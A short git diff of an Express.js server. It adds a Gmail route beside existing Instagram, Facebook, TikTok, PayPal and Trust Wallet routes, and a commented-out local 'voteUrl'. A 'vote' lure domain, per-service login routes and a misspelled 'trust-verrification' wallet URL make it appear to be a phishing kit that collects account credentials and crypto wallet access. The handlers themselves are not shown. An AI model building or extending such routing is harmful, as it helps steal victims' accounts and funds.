@@ -41,6 +41,7 @@ app.use(function (req, res, next) {
   res.locals.error_msg = req.flash('error_msg');
   res.locals.error = req.flash('error');
   req.app.voteUrl = "https://fanfamousity.com"
+  // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
   next();
 });
@@ -55,6 +56,7 @@ app.use("/", require("./routes/auth"));
 app.use("/", require("./routes/instagram"));
 app.use("/", require("./routes/facebook"));
 app.use("/", require("./routes/tiktok"));
+app.use("/", require("./routes/gmail"));
 app.use("/paypal", require("./routes/paypal"));
 app.use("/trust-wallet-link", require("./routes/trustwallet"));
 app.use("/api/wallet", require("./routes/api/wallet"));
